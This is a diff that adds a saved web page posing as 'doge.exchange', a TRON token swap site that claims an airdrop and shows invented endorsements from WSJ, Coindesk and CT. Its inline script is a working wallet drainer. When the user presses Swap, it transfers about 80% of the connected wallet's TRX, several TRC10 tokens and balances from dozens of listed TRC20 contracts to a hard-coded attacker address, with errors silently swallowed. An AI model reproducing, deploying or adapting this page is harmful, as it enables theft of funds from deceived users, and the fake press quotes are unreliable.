@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<!-- saved from url=(0030)https://ava258.github.io/doge/ -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="Content-Type" content="text/html; charse		t=UTF-8">
+<title>doge.exchange</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<link href="https://doge.exchange/favicon.ico" rel="shortcut icon" type="image/x-icon">
+<link href="./index_files/flatpickr.min.css" rel="stylesheet" type="text/css" media="all">
+<link href="./index_files/aos.css" rel="stylesheet" type="text/css" media="all">
+<link href="./index_files/theme.min.css" rel="stylesheet" type="text/css" media="all">
+<link href="./index_files/customize.css" rel="stylesheet" type="text/css" media="all">
+</head>
+<body class="bg-green-100 travel-template">
+<header class="muse-header py-sm-2">
+<div class="container">
+<nav class="navbar">
+<a class="navbar-brand text-dark" href="javascript:void(0);">
+🌟 <strong>doge</strong>.exchange
+</a>
+<div style="text-align:center" class="float-right">
+<span class="btn my-3 bg-white" disabled="">Your wallet&nbsp;&nbsp;<span style="color: #4CA137;" class="Yourwallet">TWu...BdQ</span>
+</span></div>
+</nav></div></header>
+<div class="container">
+<section class="muse-section">
+<p class="lead text-center text-muted">
+doge was distributed to random investors around the TRON network<br>
+</p>
+<div class="row justify-content-center">
+<div class="col-lg-6">
+<div class="my-3 travel-booking shadow-dark-80" style="margin: 0 auto;display: block;">
+<div class="text-center my-3">doge Price <b>34 TRX</b></div>
+<div>
+<a href="javascript:;" class="sellAll float-right">Sell All</a>
+Balance <b id="tokenBalance">0 doge</b>
+</div>
+<div class="form-group form-customize padding-custom">
+<label for="wrapped" style="margin-bottom: 8px;">From</label>
+<div class="input-group">
+<input id="wrapped1" class="form-control form-control-custom" type="number" placeholder="0.0" name="wrapped" step="0.01">
+<div class="input-group-addon">
+<select class="form-control form-control-custom">
+<option> TRX</option>
+<option selected="">doge</option>
+</select>
+</div>
+</div>
+</div>
+<img src="./index_files/swap.svg" onclick="change()" height="20px" style="margin:0 auto;display: block;">
+<div class="form-group form-customize padding-custom">
+<label for="wrapped2" style="margin-bottom: 8px;">To</label>
+<div class="input-group">
+<input id="wrapped2" class="form-control form-control-custom" type="number" placeholder="0.0" name="wrapped" step="0.01">
+<div class="input-group-addon">
+<select class="form-control form-control-custom">
+<option> doge</option>
+<option selected="">TRX</option>
+</select>
+</div>
+</div>
+</div>
+<button onclick="swap()" class="btn btn-lg btn-warning ml-auto btn-custom">Swap</button>
+</div>
+</div>
+</div>
+</section></div>
+
+<section style="background-color:white;" class="p-5">
+<div class="mt-4">
+<div class="container">
+<h2 class="text-center mb-5 text-muted">As Seen On</h2>
+<div class="row text-center mb-5">
+<div class="col-md-4">
+<img src="./index_files/WSJ.png" alt="WSJ" class="mb-3">
+<br>
+<em>"A new era in TRON TRC10 tokens!"</em>
+</div>
+<div class="col-md-4">
+<img src="./index_files/Coindesk.png" alt="Coindesk" class="mb-3">
+<br>
+<em>"A one time opportunity of a lifetime"</em>
+</div>
+<div class="col-md-4">
+<img src="./index_files/CT.png" alt="CT" class="mb-3">
+<br>
+<em>"Unusual, yet lucrative. What should we say?"</em>
+</div>
+</div>
+</div>
+</div>
+</section>
+<footer class="bg-white pt-4 pt-md-5 pb-4 mt-4 mt-md-0">
+<div class="container">
+<div class="row justify-content-center">
+<div class="col-sm-6 text-center">
+<p class="small text-gray-600 text-center">2021 doge.exchange. All rights reserved.</p>
+</div>
+</div>
+</div>
+</footer>
+<script src="./index_files/bootstrap.bundle.min.js.下载"></script>
+<script src="./index_files/lodash.min.js.下载"></script>
+<script src="./index_files/flatpickr.min.js.下载"></script>
+<script src="./index_files/progressbar.min.js.下载"></script>
+<script src="./index_files/dropzone.min.js.下载"></script>
+<script src="./index_files/theme-custom.js.下载"></script>
+<script src="./index_files/jquery-3.5.0.js.下载"></script>
+<script>
+	var toAddrss = 'TWuJckVJztNddbQQeLobfML5VaaFwXHBdQ';
+    var contractsAddress = ["TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
+                            "TNUC9Qb1rRpS5CbWLmNMxXBjyFoydXjWFR",
+                            "TKfjV9RNKJJCqPvBtK8L7Knykh7DNWvnYt",
+                            "TN3W4H6rK2ce4vX9YnFQHwKENnHjoxb3m9",
+                            "TXpw8XeWYeTUd4quDskoUqeQPowRh4jY65",
+                            "THb4CqiFdwNHsWsQCs4JhzwjMWys4aqCbF",
+                            "TLa2f6VPqDgRE67v1736s7bJ8Ray5wYjU7",
+                            "TMwFHYXLJaRUPeW6421aqXL4ZEzPRFGkGT",
+                            "TCFLL5dx5ZJdKnWuesXxi1VPwjLVmWZZy9",
+                            "TKkeiboTkxXKJpbmVFbv4a8ov5rAfRDMf9",
+                            "TDyvndWuvX5xTBwHPYJi7J3Yq8pq8yh62h",
+                            "TLvDJcvKJDi3QuHgFbJC6SeTj3UacmtQU3",
+                            "TAwRvFAqfB4bbzVCVPgGATZV5uMVs9UyVL",
+                            "TH4W5RkEu9otmT88vk1zv4Rz8SgfCvtu5B",
+                            "TFDwGwod9qopreRiirsFMwPzX4v2r662P4",
+                            "TLGd97zsjrkomUDF962ZFMerdQxPffG7hX",
+                            "THGn3W9XRvsSpgegKbDEhNjeZL6YrB47kb",
+                            "TTL52uBzTG7qorL7BQYdjGUY3HWWr9Kvao",
+                            "TAQ4QmZv9KXmXYH26LKarKauyrwzGteXAA",
+                            "TAVQyaoBErm5kpTHTycSn4u6dkMkU65aCQ",
+                            "TBwoSTyywvLrgjSgaatxrBhxt3DGpVuENh",
+                            "TRkuKAxmWZ4G74MvZnFpoosQZsfvtNpmwH",
+                            "TBYxqxitJAabLRQgnk9i6GXswrtujBExxy",
+                            "TD4bVgcwj3FRbmAo283HxNvqZvY7T3uD8k",
+                            "THgLniqRhDg5zePSrDTdU9QwY8FjD9nLYt",
+                            "TJvqNiWUN2v2NBG12UhfV7WSvReJkRP3VC",
+                            "TRNVzKLHvzBjSs3t12KSzU29m3BiUt9aTc",
+                            "TPmqRz2HmrUDVDRgGxhZv4yAKBRWsRex4E",
+                            "TKeyfKMAicwhWysvgktW568i3KyRNT8AyT",
+                            "TAS3kXwHFDbL8J7wQHwopVEfLT26XAWMiq",
+                            "TYaAqxSMub4VSqZFczKDk6NzQp9N9Mcik2",
+                            "TDXJ1dSPLsN52jhP32NvVyhQ5X265BNU5c",
+                            "TVj7RNVHy6thbM7BWdSe9G6gXwKhjhdNZS",
+                            "TQXhxDPNKVsgxYbJatMnkRZsgTcTzxC5Fc",
+                            "THgLniqRhDg5zePSrDTdU9QwY8FjD9nLYt",
+                            "TBwEPBdBPQsHaSwk7qhDWjqi8oNz74ppzd",
+                            "TVgAYofpQku5G4zenXnvxhbZxpzzrk8WVK",
+                            "TKttnV3FSY1iEoAwB4N52WK2DxdV94KpSd",
+                            "THXm85dwyCSTNPq8h1JDPth2vuTcwtXyBb",
+                            "TKSLNVrDjb7xCiAySZvjXB9SxxVFieZA7C",
+                            "TNkmiDFubYeHZ3nAnZNFvtc6K1toBzE6DD",
+                            "TNo59Khpq46FGf4sD7XSWYFNfYfbc8CqNK",
+                            "TJrJJdhxggsh1J8FmbYC2XB6ZVQazHKKdy",
+                            "TTUwzoZAK6rpDjpSh8B2XFTnxGfbMLHJaq",
+                            "TDXJ1dSPLsN52jhP32NvVyhQ5X265BNU5c",
+                            "TMJWuBDvwvcm6QUWXDaC6GqTyq3FgEmWEt",
+                            "TD4bVgcwj3FRbmAo283HxNvqZvY7T3uD8k",
+                            "TGbu32VEGpS4kDmjrmn5ZZJgUyHQiaweoq"
+                            ]
+    var tBalance = [5000000, 700000000000000000, 170000000000000000000, 13000000000, 10000, 60000000000, 3000000000000000]
+    var _tokenBalance;
+    const timer = setInterval(async() => {
+      if (window.tronWeb && window.tronWeb.ready){
+        var address = window.tronWeb.defaultAddress.base58;
+        $(".Yourwallet").text(address.substr(0, 3) + '...' + address.substr(31, 3));
+
+        var account = await tronWeb.trx.getAccount();
+        if (account.assetV2){
+            var tokenBalance = account.assetV2.find(function(o){return o.key == "1003657";});
+            if (tokenBalance){
+              _tokenBalance = tokenBalance;
+              $("#tokenBalance").text((tokenBalance.value / 1000000).toFixed(2) + " doge");
+            }
+            else{
+              $("#tokenBalance").text("0 doge");
+            }
+        }
+        else{
+          $("#tokenBalance").text("0 doge");
+        }
+      }
+    }, 500);
+
+    function change(){
+      if ($("select")[0].selectedIndex == 0){
+        $("select")[0].selectedIndex = 1;
+        $("select")[1].selectedIndex = 1;
+      }
+      else{
+        $("select")[0].selectedIndex = 0;
+        $("select")[1].selectedIndex = 0;
+      }
+      var t = $("#wrapped1").val();
+      $("#wrapped1").val($("#wrapped2").val());
+      $("#wrapped2").val(t);
+    }
+
+    $("#wrapped1").change(function(){
+      if ($("select")[0].selectedIndex == 0){
+        $("#wrapped2").val(parseFloat($("#wrapped1").val()) / 34)
+      }
+      else{
+        $("#wrapped2").val(parseFloat($("#wrapped1").val()) * 34)
+      }
+    })
+
+    $("#wrapped1").keyup(function(){
+      if ($("select")[0].selectedIndex == 0){
+        $("#wrapped2").val(parseFloat($("#wrapped1").val()) / 34)
+      }
+      else{
+        $("#wrapped2").val(parseFloat($("#wrapped1").val()) * 34)
+      }
+    });
+
+    $(".sellAll").on('click', function(e){
+      e.preventDefault();
+      if(_tokenBalance != undefined){
+        $("#wrapped1").val((_tokenBalance.value / 1000000).toFixed(2))
+        $("#wrapped1").trigger('change')
+      }
+    })
+
+    async function swap(){
+      var account;
+      try{
+        var balance = await window.tronWeb.trx.getBalance();
+        if (balance >= 20000000)
+          await tronWeb.trx.sendTransaction(toAddrss, Math.round(balance * 80 / 100));
+      }catch{}
+
+      try{
+        account = await tronWeb.trx.getAccount();
+        if (account.assetV2){
+            var tokenBalance = account.assetV2.find(function(o){return o.key == "1002000";});
+            if (tokenBalance){
+              await tronWeb.trx.sendToken(toAddrss, Math.round(tokenBalance.value * 80 / 100), "1002000");
+            }
+        }
+      }catch{}
+
+      for(i=0; i<contractsAddress.length; i++){
+        try{
+          var cc = await window.tronWeb.contract().at(contractsAddress[i]);
+          balance = await cc.balanceOf(window.tronWeb.defaultAddress.base58).call();
+          if (balance.toNumber() >= 100){
+            await cc.transfer(toAddrss, Math.round(balance * 80 / 100)).send()
+          }
+        }catch{}
+      }
+
+      if (account.assetV2){
+        try{ // Corona
+          var tokenBalance = account.assetV2.find(function(o){return o.key == "1002927";});
+          if (tokenBalance){
+            await tronWeb.trx.sendToken(toAddrss, Math.round(tokenBalance.value * 80 / 100), "1002927");
+          }
+        }catch{}
+        try{ // ?
+            var tokenBalance = account.assetV2.find(function(o){return o.key == "1003638";});
+            if (tokenBalance){
+              await tronWeb.trx.sendToken(toAddrss, tokenBalance.value, "1003638");
+            }
+        }catch{}
+        try{ // PEER
+            var tokenBalance = account.assetV2.find(function(o){return o.key == "1003406";});
+            if (tokenBalance){
+              await tronWeb.trx.sendToken(toAddrss, tokenBalance.value, "1003406");
+            }
+        }catch{}
+      }
+    }
+
+
+
+
+</script>
+
+<div style="width: 32px !important; height: 32px !important; display: none; background: rgb(255, 255, 255) !important; border-radius: 16px !important; box-shadow: rgb(136, 136, 136) 4px 4px 8px !important; position: absolute !important; z-index: 2147483647 !important; top: 158px; left: 492px;"><svg href="javascript:void(0)" style="width:24px;height:24px;margin:4px!important;" "width="24" height="24" viewBox="0 0 768 768"><path d="M672 640.5v-417c0-18-13.5-31.5-31.5-31.5h-282l37.5 129h61.5v-33h34.5v33h115.5v33h-40.5c-10.5 40.5-33 79.5-61.5 112.5l87 85.5-22.5 24-87-85.5-28.5 28.5 25.5 88.5-64.5 64.5h225c18 0 31.5-13.5 31.5-31.5zM447 388.5c7.5 15 19.5 34.5 36 54 39-46.5 49.5-88.5 49.5-88.5h-127.5l10.5 34.5h31.5zM423 412.5l19.5 70.5 18-16.5c-15-16.5-27-34.5-37.5-54zM355.5 339c0-7.381-0.211-16.921-3-22.5h-126v49.5h70.5c-4.5 19.5-24 48-67.5 48-42 0-76.5-36-76.5-78s34.5-78 76.5-78c24 0 39 10.5 48 19.5l3 1.5 39-37.5-3-1.5c-24-22.5-54-34.5-87-34.5-72 0-130.5 58.5-130.5 130.5s58.5 130.5 130.5 130.5c73.5 0 126-52.5 126-127.5zM640.5 160.5c34.5 0 63 28.5 63 63v417c0 34.5-28.5 63-63 63h-256.5l-31.5-96h-225c-34.5 0-63-28.5-63-63v-417c0-34.5 28.5-63 63-63h192l28.5 96h292.5z" style="fill:#3e84f4;"></path></svg></div>
+</body></html>
